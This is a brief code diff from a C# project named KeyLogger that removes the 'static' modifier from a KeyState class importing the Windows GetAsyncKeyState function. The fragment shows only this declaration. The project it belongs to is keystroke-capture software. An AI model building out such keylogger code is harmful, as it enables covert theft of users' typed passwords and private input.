@@ -2,7 +2,7 @@
 
 namespace KeyLogger
 {
-    static class KeyState
+    class KeyState
     {
         [DllImport("User32.dll")]
         public static extern short GetAsyncKeyState(int keyNumber);
